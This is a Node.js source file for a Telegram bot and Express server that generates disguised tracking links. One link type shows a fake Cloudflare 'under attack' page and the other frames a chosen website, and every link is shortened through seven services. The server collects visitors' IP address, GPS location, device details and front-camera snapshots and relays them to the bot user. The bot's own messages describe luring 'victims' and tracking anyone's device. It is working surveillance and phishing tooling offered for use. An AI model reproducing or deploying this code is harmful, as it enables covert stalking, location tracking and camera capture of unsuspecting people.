const fs = require('fs');
const express = require("express");
var cors = require('cors');
var bodyParser = require('body-parser');
const { TasteShortener } = require('@tastekim/url-shortener');
const shortUrlNew = require("node-short-url-normal");
const range = require('range-parser');
const isgd = require('isgd');
const vgd = require('vgd');
const gotiny = require("gotiny")
const util = require('util');
const moment = require('moment');
const cleanuri = require('node-cleanuri');
const axios = require('axios');
const atob = require('atob');
const nodeUrlShortener = require("node-url-shortener");
const lsShorten = require('tiny-url-generator');
const TinyURL = require('tinyurl');
const ejs = require ('ejs');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(process.env["bot"], {polling: true});
var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
const readFileAsync = util.promisify(fs.readFile);
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.use(express.static(path.join(__dirname, 'uploads')));
app.set("view engine", "ejs");

async function shortenUrlOp(originalUrl) {
    return new Promise((resolve, reject) => {
        vgd.shorten(originalUrl, (res) => {
            resolve(res);
        });
    });
}

async function shortenUrlProNew(url) {
  try {
    const data = await shortUrlNew(url);
    return data;
  } catch (error) {
    console.error("Error shortening URL:", error.message);
    throw error;
  }
}

async function shortenUrlPro(url, title) {
  try {
    const response = await lsShorten.generate({
      url,
      title
    });
    
    const shortenedLink = response.data.link;
    return shortenedLink;
  } catch (error) {
    console.error("Error: ", error);
    throw error;
  }
}

async function shortenerPro(urlToShorten) {
  try {
    const { shortenUrl } = await TasteShortener(urlToShorten);
    return shortenUrl;
  } catch (error) {
    throw new Error('Error shortening URL: ' + error.message);
  }
}

async function createShortLink(longUrl) {
    return new Promise((resolve, reject) => {
        isgd.shorten(longUrl, (shortUrl) => {
            if (shortUrl) {
                resolve(shortUrl);
            } else {
                reject(new Error('Failed to shorten the URL'));
            }
        });
    });
}

// Function using node-url-shortener with promises
function shortenWithNodeUrlShortener(originalUrl) {
    return new Promise((resolve, reject) => {
        nodeUrlShortener.short(originalUrl, (err, url) => {
            if (err) {
                reject(err);
            } else {
                resolve(url);
            }
        });
    });
}

// Function using tinyurl with promises
function shortenWithTinyURL(originalUrl) {
    return new Promise((resolve, reject) => {
        TinyURL.shorten(originalUrl, (res, err) => {
            if (err) {
                reject(err);
            } else {
                resolve(res);
            }
        });
    });
}

const channelUsername1 = 'RenusHackingArmy';
const channelUsername2 = 'RenusHackingArmy';

const joinChannel1Button = {
  text: '𝙅𝙊𝙄𝙉 𝘾𝙃𝘼𝙉𝙉𝙀𝙇👻',
  url: 'https://t.me/MOGATEAM'
};

const joinChannel2Button = {
  text: '𝗝𝗢𝗜𝗡 𝗚𝗥𝗢𝗨𝗣🚁',
  url: 'https://t.me/MOGATEAM_CHAT'
};

// Create a button with the URL
const contactUsButton = {
  text: '𝘾𝙊𝙉𝙏𝘼𝘾𝙏 𝙈𝙀📞',
  url: 'https://t.me/emirofcordoba'
};

const checkJoinedButton = {
  text: '𝗝𝗢𝗜𝗡𝗘𝗗👽',
  callback_data: 'start_command'
};

bot.on('callback_query', (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  if (data === 'start_command') {
    startCommand(chatId);
  }
});

async function startCommand(chatId) {
  try {
    const [member1, member2] = await Promise.all([
      bot.getChatMember(channelUsername1, chatId),
      bot.getChatMember(channelUsername2, chatId),
    ]);

    if (
      (member1.status === 'member' || member1.status === 'administrator' || member1.status === 'creator') &&
      (member2.status === 'member' || member2.status === 'administrator' || member2.status === 'creator')
    ) {
      const inlineKeyboard = {
        inline_keyboard: [
          [
            { text: "𝗖𝗥𝗘𝗔𝗧𝗘 𝗔 𝗟𝗜𝗡𝗞🖥️", callback_data: "crenew" },
            contactUsButton,
          ],
          [
            { text: "𝙃𝙀𝙇𝙋☹️👷", callback_data: "alhaiwan" },
          ],
        ],
      };

      const messageOptions = {
        reply_markup: JSON.stringify(inlineKeyboard),
      };

      await bot.sendMessage(
        chatId,
        `𝗛𝗲𝗹𝗹𝗼 𝗺𝘆 𝗳𝗿𝗶𝗲𝗻𝗱\n\n𝗜 𝗮𝗺 𝗮 𝘀𝗺𝗮𝗿𝘁 𝗯𝗼𝘁 𝗺𝗮𝗱𝗲 𝗯𝘆 @MOGATEAM. 🤖\n\n🔍 𝗬𝗼𝘂 𝗰𝗮𝗻 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁 𝘁𝗼 𝘁𝗿𝗮𝗰𝗸 𝗽𝗲𝗼𝗽𝗹𝗲 𝗯𝘆 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝘁𝗵𝗲𝗺 𝗮 𝘀𝗶𝗺𝗽𝗲 𝗹𝗶𝗻𝗸.\n\n𝗜𝘁 𝗰𝗮𝗻 𝗰𝗼𝗹𝗹𝗲𝗰𝘁 𝗶𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗹𝗶𝗸𝗲:-\n\n➊ 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣📍\n➋ 𝘿𝙚𝙫𝙞𝙘𝙚 𝘿𝙚𝙩𝙖𝙞𝙡𝙨📱\n➌ 𝘾𝙖𝙢𝙚𝙧𝙖 𝙎𝙣𝙖𝙥𝙨𝙝𝙤𝙩𝙨 📸.\n\n𝗖𝗹𝗶𝗰𝗸 "𝗛𝗘𝗟𝗣" 𝗳𝗼𝗿 𝗺𝗼𝗿𝗲 𝗶𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 🆘`,
        messageOptions
      );
    } else {
      const messageOptions = {
        reply_markup: JSON.stringify({
          inline_keyboard: [
            [joinChannel1Button, joinChannel2Button],
            [checkJoinedButton, contactUsButton],
          ],
        }),
      };

      await bot.sendMessage(
        chatId,
        `𝗬𝗼𝘂 𝗰𝗮𝗻 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁 𝘁𝗼 𝘁𝗿𝗮𝗰𝗸 𝗮𝗻𝘆𝗼𝗻𝗲\'𝘀 𝗱𝗲𝘃𝗶𝗰𝗲 𝗷𝘂𝘀𝘁 𝘁𝗵𝗿𝗼𝘂𝗴𝗵 𝗮 𝘀𝗶𝗺𝗽𝗹𝗲 𝗹𝗶𝗻𝗸\n\n𝗜𝘁 𝗰𝗮𝗻 𝗴𝗮𝘁𝗵𝗲𝗿 𝗶𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗹𝗶𝗸𝗲 𝗜𝗣 𝗮𝗱𝗱𝗿𝗲𝘀𝘀, 𝗹𝗼𝗰𝗮𝘁𝗶𝗼𝗻, 𝗰𝗮𝗺𝗲𝗿𝗮 𝘀𝗻𝗮𝗽𝘀, 𝗯𝗮𝘁𝘁𝗲𝗿𝘆 𝗹𝗲𝘃𝗲𝗹, 𝗻𝗲𝘁𝘄𝗼𝗿𝗸 𝗶𝗻𝗳𝗼 𝗮𝗻𝗱 𝗮 𝘄𝗶𝗱𝗲 𝗿𝗮𝗻𝗴𝗲 𝗼𝗳 𝗶𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗮𝗯𝗼𝘂𝘁 𝘁𝗵𝗲𝗶𝗿 𝗱𝗲𝘃𝗶𝗰𝗲, 𝗽𝗹𝘂𝘀 𝗺𝗮𝗻𝘆 𝗺𝗼𝗿𝗲 𝗯𝗲𝗻𝗲𝗳𝗶𝘁𝘀\n\n`;
      await bot.sendMessage(chatId, messageOptions);
    }
  } catch (error) {
    console.error(error);
  }
}

/// Modify your URL here
var hostURL = 'https://trackdown-k1l1.onrender.com';

// TOGGLE for Shorters
var use1pt = true;

app.get("/w/:path/:uri", (req, res) => {
    var ip;
    var d = new Date();
    d = d.toJSON().slice(0, 19).replace('T', ':');

    if (req.headers['x-forwarded-for']) {
        ip = req.headers['x-forwarded-for'].split(",")[0];
    } else if (req.connection && req.connection.remoteAddress) {
        ip = req.connection.remoteAddress;
    } else {
        ip = req.ip;
    }

    if (req.params.path != null) {
        res.render("webview", {
            ip: ip,
            time: d,
            url: atob(req.params.uri),
            uid: req.params.path,
            a: hostURL,
            t: use1pt
        });
    } else {
        res.redirect("https://t.me/MOGATEAM");
    }
});

app.get("/c/:path/:uri", (req, res) => {
    var ip;
    var d = new Date();
    d = d.toJSON().slice(0, 19).replace('T', ':');

    if (req.headers['x-forwarded-for']) {
        ip = req.headers['x-forwarded-for'].split(",")[0];
    } else if (req.connection && req.connection.remoteAddress) {
        ip = req.connection.remoteAddress;
    } else {
        ip = req.ip;
    }

    if (req.params.path != null) {
        res.render("cloudflare", {
            ip: ip,
            time: d,
            url: atob(req.params.uri),
            uid: req.params.path,
            a: hostURL,
            t: use1pt
        });
    } else {
        res.redirect("https://t.me/MOGATEAM");
    }
});

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  startCommand(chatId);
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const messageText = msg.text;

  // Check if the message is a reply to "🌐 𝙀𝙣𝙩𝙚𝙧 𝙮𝙤𝙪𝙧 𝙐𝙍𝙇" or if the message starts with "http"
  if (msg.reply_to_message?.text === '🌐 𝙀𝙣𝙩𝙚𝙧 𝙮𝙤𝙪𝙧 𝙐𝙍𝙇' || (msg.text && msg.text.toLowerCase().startsWith("http"))) {
    // Run the function for this specific case
    createLink(chatId, msg.text);
  }

  if (msg.text === "/help") {
    // Create and send the help message with inline keyboard
    sendHelpMessage(chatId);
  }
});

function sendHelpMessage(chatId) {
  const howToUseButton = {
    text: '𝙃𝙊𝙒 𝙏𝙊 𝙐𝙎𝙀❓',
    url: 'https://t.me/linkerboter/3',
  };

  const allOurBotsButton = {
    text: '𝘼𝙇𝙇 𝙊𝙐𝙍 𝘽𝙊𝙏𝙎👾',
    url: 'https://t.me/MOGATEAM_BOTS/5', // Replace with your URL
  };

  const errorResolutionButton = {
    text: '𝗘𝗥𝗥𝗢𝗥 𝗥𝗘𝗦𝗢𝗟𝗨𝗧𝗜𝗢𝗡⛵',
    url: 'https://t.me/linkerboter/2', // Replace with your URL
  };

  const rulesButton = {
    text: '𝗥𝗨𝗟𝗘📐',
    callback_data: 'show_rules',
  };

  const helpgenlinkButton = {
    text: '𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘 𝗔 𝗟𝗜𝗡𝗞🤡',
    callback_data: 'gen_link',
  };

  const replyMarkup = {
  inline_keyboard: [
    [howToUseButton, allOurBotsButton],
    [contactUsButton, errorResolutionButton],
    [renewLinkButton],
  ],
};

  const helpMessage = `𝐓𝐡𝐫𝐨𝐮𝐠𝐡 𝐭𝐡𝐢𝐬 𝐛𝐨𝐭 𝐲𝐨𝐮 𝐜𝐚𝐧 𝐭𝐫𝐚𝐜𝐤 𝐩𝐞𝐨𝐩𝐥𝐞 𝐣𝐮𝐬𝐭 𝐛𝐲 𝐬𝐞𝐧𝐝𝐢𝐧𝐠 𝐚 𝐬𝐢𝐦𝐩𝐥𝐞 𝐥𝐢𝐧𝐤.\n\n𝗖𝗹𝗶𝗰𝗸 𝗼𝗻 "𝗖𝗥𝗘𝗔𝗧𝗘 𝗔 𝗟𝗜𝗡𝗞📡" 𝘁𝗼 𝗯𝗲𝗴𝗶𝗻, 𝐚𝐟𝐭𝐞𝐫𝐰𝐚𝐫𝐝𝐬 𝐢𝐭 𝐰𝐢𝐥𝐥 𝐚𝐬𝐤 𝐲𝐨𝐮 𝐟𝐨𝐫 𝐚 𝐔𝐑𝐋 𝐰𝐡𝐢𝐜𝐡 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐢𝗻 𝐢𝐟𝐫𝐚𝐦𝐞 𝐭𝐨 𝐥𝐮𝐫𝐞 𝐯𝐢𝐜𝐭𝐢𝐦𝐬\n\n𝗢𝗿, 𝗰𝗹𝗶𝗰𝗸 𝗼𝗻 "𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘 𝗔 𝗟𝗜𝗡𝗞🎙️" 𝘁𝗵𝗲𝗻 𝘀𝗲𝗹𝗲𝗰𝘁 𝗮 𝘄𝗲𝗯𝘀𝗶𝘁𝗲 𝗮𝗻𝗱 𝗶𝘁'𝗹𝗹 𝗴𝗲𝗻𝗲𝗿𝗮𝘁𝗲 𝘀𝗼𝗺𝗲 𝗹𝗶𝗻𝗸𝘀, 𝗻𝗼𝘄 𝗿𝗲𝗮𝗱 𝘁𝗵𝗲 𝗿𝗲𝘀t 𝗼𝗳 𝘁𝗵𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲\n\n𝐀𝐟𝐭𝐞𝐫 𝐫𝐞𝐜𝐞𝐢𝐯𝐢𝗻𝐠 𝐭𝐡𝐞 𝐔𝐑𝐋 𝐢𝐭 𝐰𝐢𝐥𝐥 𝐬𝐞𝐧𝐝 𝐲𝐨𝐮 𝟐 𝐥𝐢𝐧𝐤𝐬 𝐰𝐡𝐢𝐜𝐡 𝐲𝐨𝐮 𝐜𝐚𝐧 𝐮𝐬𝐞 𝐭𝐨 𝐭𝐫𝐚𝐜𝐤 𝐩𝐞𝐨𝐩𝐥𝐞.\n\n𝐒𝐩𝐞𝐜𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝗻𝐬.\n\n𝟭. 𝐂𝐥𝐨𝐮𝐝𝐟𝐥𝐚𝐫𝐞 𝐋𝐢𝐧𝐤: 𝐓𝐡𝐢𝐬 𝐦𝐞𝐭𝐡𝐨𝐝 𝐰𝐢𝐥𝐥 𝐬𝐡𝐨𝐰 𝐚 𝐜𝐥𝐨𝐮𝐝𝐟𝐥𝐚𝐫𝐞 𝐮𝗻𝐝𝐞𝐫 𝐚𝐭𝐭𝐚𝐜𝐤 𝐩𝐚𝐠𝐞 𝐭𝐨 𝐠𝐚𝐭𝐡𝐞𝐫 𝐢𝗻𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝗻 𝐚𝗻𝐝 𝐚𝐟𝐭𝐞𝐫𝐰𝐚𝐫𝐝𝐬 𝐭𝐡𝐞 𝐯𝐢𝐜𝐭𝐢𝐦𝐞 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐫𝐞𝐝𝐢𝐫𝐞𝐜𝐭𝐞𝐝 𝐭𝐨 𝐭𝐡𝐞 𝐝𝐞𝐬𝐭𝐢𝗻𝐚𝐭𝐢𝐨𝗻𝐞𝐝 𝐔𝐑𝐋.\n𝟮. 𝐖𝐞𝐛𝐯𝐢𝐞𝐰 𝐋𝐢𝐧𝐤: 𝐓𝐡𝐢𝐬 𝐰𝐢𝐥𝐥 𝐬𝐡𝐨𝐰 𝐚 𝐰𝐞𝐛𝐬𝐢𝐭𝐞 𝐞.𝐠., 𝐁𝐢𝐧𝐠, 𝐝𝐚𝐭𝐢𝐧𝐠 𝐬𝐢𝐭𝐞𝐬, 𝐞𝐭𝐜. 𝐮𝗻𝐬𝐢𝗻𝐠 𝐚𝗻 𝐢𝐟𝐫𝐚𝐦𝐞 𝐟𝐨𝐫 𝐠𝐚𝐭𝐡𝐞𝐫𝐢𝗻𝐠 𝐢𝗻𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝗻. ⚠️ 𝐌𝐚𝐧𝐲 𝐬𝐢𝐭𝐞𝐬 𝐦𝐚𝐲 𝗻𝐨𝐭 𝐰𝐨𝐫𝐤 𝐮𝗻𝐝𝐞𝐫 𝐭𝐡𝐢𝐬 𝐦𝐞𝐭𝐡𝐨𝐝 𝐢𝐟 𝐭𝐡𝐞𝐲 𝐡𝐚𝐯𝐞 𝐭𝐡𝐞 𝐱-𝐟𝐫𝐚𝐦𝐞 𝐡𝐞𝐚𝐝𝐞𝐫 𝐩𝐫𝐞𝐬𝐞𝗻𝐭, 𝐞.𝐠., https://google.com\n\n𝐓𝐡𝐢𝐬 𝐩𝐫𝐨𝐣𝐞𝐜𝐭 𝐢𝐬 𝐦𝐚𝐝𝐞 𝐛𝐲 @MOGATEAM`;

  bot.sendMessage(chatId, helpMessage, { reply_markup: JSON.stringify(replyMarkup) });
}

// Handle callback queries
bot.on('callback_query', (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  if (data === 'show_rules') {

    // Display the rules message as an alert
    const rulesMessage = "𝗗𝗼𝗻'𝘁 𝗹𝗲𝗮𝘃𝗲 𝗮𝗻𝘆 𝗼𝗳 𝘁𝗵𝗲 𝗰𝗵𝗮𝗻𝗻𝗲𝗹𝘀⚠️.";
    bot.answerCallbackQuery({
      callback_query_id: callbackQuery.id,
      text: rulesMessage,
      show_alert: true,
    });
  }
});

async function createLink(cid, msg) {
  if (msg.toLowerCase().includes('http') || msg.toLowerCase().includes('https')) {
    var url = cid.toString(36) + '/' + Buffer.from(msg).toString('base64');
    
    bot.sendChatAction(cid, 'typing');

    var cUrl = `${hostURL}/c/${url}`;
    var wUrl = `${hostURL}/w/${url}`;
    var cShortUrl1 = await shortenWithNodeUrlShortener(cUrl);
    var cShortUrl2 = await shortenWithTinyURL(cUrl);
    var cShortUrl3 = await createShortLink(cUrl);
    var cShortUrl4 = await shortenUrlProNew(cUrl);
    var cShortUrl5 = await shortenerPro(cUrl);
    var cShortUrl6 = await shortenUrlPro(cUrl, cUrl);
    var cShortUrl7 = await shortenUrlOp(cUrl);
                
    var wShortUrl1 = await shortenWithNodeUrlShortener(wUrl);
    var wShortUrl2 = await shortenWithTinyURL(wUrl);
    var wShortUrl3 = await createShortLink(wUrl);
    var wShortUrl4 = await shortenUrlProNew(wUrl);
    var wShortUrl5 = await shortenerPro(wUrl);
    var wShortUrl6 = await shortenUrlPro(wUrl, wUrl);
    var wShortUrl7 = await shortenUrlOp(wUrl);
                
    bot.sendMessage(
      cid,
      `𝗡𝗲𝘄 𝗹𝗶𝗻𝗸𝘀 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗰𝗿𝗲𝗮𝘁𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n\n𝗨𝗥𝗟: ${msg}\n\n✅𝗬𝗼𝘂𝗿 𝗟𝗶𝗻𝗸𝘀\n\n🌐 𝗖𝗹𝗼𝘂𝗱𝙵𝗹𝗮𝗿𝗲'𝘀 𝗣𝗮𝗴𝗲 𝗟𝗶𝗻𝗸𝘀\n\n𝟭. ${cShortUrl1}\n𝟮. ${cShortUrl2}\n𝟯. ${cShortUrl3}\n𝟰. ${cShortUrl4}\n𝟱. ${cShortUrl5}\n𝟲. ${cShortUrl6}\n𝟳. ${cShortUrl7}\n\n🌐 𝗪𝗲𝗯𝗩𝗶𝗲𝘄'𝘀 𝗣𝗮𝗴𝗲 𝗟𝗶𝗻𝗸𝘀\n\n𝟭. ${wShortUrl1}\n𝟮. ${wShortUrl2}\n𝟯. ${wShortUrl3}\n𝟰. ${wShortUrl4}\n𝟱. ${wShortUrl5}\n𝟲. ${wShortUrl6}\n𝟳. ${wShortUrl7}`
    );
  } else {
    bot.sendMessage(
      cid,
      `⚠️ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗨𝗥𝗟, 𝗶𝗻𝗰𝗹𝘂𝗱𝗶𝗻𝗴 http 𝗼𝗿 https`
    );
    createNew(cid);
  }
}

function createNew(chatId) {
  bot.sendMessage(chatId, "🌐 𝙀𝙣𝙩𝙚𝙧 𝙮𝙤𝙪𝙧 𝙐𝙍𝙇", {
    reply_markup: {
      force_reply: true
    }
  });
}

app.get("/", (req, res) => {
  var ip =
    req.headers['x-forwarded-for'] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    req.connection.socket.remoteAddress;

  if (ip.includes(',')) {
    ip = ip.split(',')[0];
  }

  res.json({ "ip": ip });
});

app.post("/location", async (req, res) => {
  var lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
  var lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
  var uid = decodeURIComponent(req.body.uid) || null;
  var acc = decodeURIComponent(req.body.acc) || null;

  if (lon != null && lat != null && uid != null && acc != null) {
    addUserToJSON(parseInt(uid, 36));
    bot.sendLocation(parseInt(uid, 36), lat, lon);

    bot.sendMessage(
      parseInt(uid, 36),
      `𝗟𝗮𝘁𝗶𝘁𝘂𝗱𝗲: ${lat}\n𝗟𝗼𝗻𝗴𝗶𝘁𝘂𝗱𝗲: ${lon}\n𝗔𝗰𝗰𝘂𝗿𝗮𝗰𝘆: ${acc} meters`
    );

    res.send("Done");
  }
});

app.post("/", async (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var data = decodeURIComponent(req.body.data) || null;

  try {
    if (uid != null && data != null) {
      data = data.replace(/<br>/g, "\n"); // Use regex to replace all occurrences
      addUserToJSON(parseInt(uid, 36));
      bot.sendMessage(parseInt(uid, 36), data, { parse_mode: "HTML" });
      res.send("Done");
    } else {
      res.status(400).send("Invalid request parameters");
    }
  } catch (error) {
    console.error("Error:", error);
    res.status(500).send("Internal Server Error");
  }
});

app.post("/camsnap", async (req, res) => {
  const uid = decodeURIComponent(req.body.uid) || null;
  const img = decodeURIComponent(req.body.img) || null;
  
  if (uid !== null && img !== null) {
    const buffer = Buffer.from(img, 'base64');

    const info = {
      filename: "camsnap.png",
      contentType: 'image/png'
    };

    try {
      // Assuming 'bot' is your Telegram bot instance
      await bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
      res.send("Done");
    } catch (error) {
      console.error(error);
      res.status(500).send("Error sending photo");
    }
  } else {
    res.status(400).send("Invalid UID or image");
  }
});

bot.on('callback_query', (query) => {
  if (query.data === 'front_cam') {
    // Generate or retrieve a random message
    var randomMessage = "𝗧𝗵𝗲 𝗶𝗺𝗮𝗴𝗲 𝗶𝘀 𝗰𝗮𝗽𝘁𝘂𝗿𝗲𝗱 𝗳𝗿𝗼𝗺 𝘁𝗵𝗲 𝘃𝗶𝗰𝘁𝗶𝗺'𝘀 𝗳𝗿𝗼𝗻𝘁 𝗰𝗮𝗺𝗲𝗿𝗮🤳😀";

    // Send the random message in an alert
    bot.answerCallbackQuery(query.id, {
      text: randomMessage,
      showAlert: true
    });
  }
});

const PORT = process.env.PORT || 5000;

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
